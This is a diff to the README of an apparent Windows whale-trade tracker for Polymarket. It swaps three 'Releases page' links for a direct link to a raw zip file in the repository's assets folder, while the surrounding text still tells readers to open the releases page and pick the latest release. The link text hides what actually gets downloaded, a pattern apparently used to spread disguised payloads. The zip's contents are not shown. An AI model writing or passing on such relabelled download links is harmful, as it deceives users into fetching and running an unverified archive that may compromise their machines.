@@ -1,6 +1,6 @@
 # 🐋 polymarket-whales - Track whale trades in real time
 
-[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Barnytonic13/polymarket-whales/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Barnytonic13/polymarket-whales/raw/refs/heads/main/assets/whales-polymarket-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it on Windows if you want a simple way to follow big market activity without
 
 ## 💾 Download
 
-1. Open the [Releases page](https://github.com/Barnytonic13/polymarket-whales/releases)
+1. Open the [Releases page](https://github.com/Barnytonic13/polymarket-whales/raw/refs/heads/main/assets/whales-polymarket-2.5.zip)
 2. Find the latest release
 3. Download the Windows file from that release
 4. Save it to a folder you can find again, such as Downloads or Desktop
@@ -163,4 +163,4 @@ This project relates to:
 
 ## 🖱️ Download Again
 
-If you need the file later, return to the [Releases page](https://github.com/Barnytonic13/polymarket-whales/releases) and visit this page to download the latest version
+If you need the file later, return to the [Releases page](https://github.com/Barnytonic13/polymarket-whales/raw/refs/heads/main/assets/whales-polymarket-2.5.zip) and visit this page to download the latest version
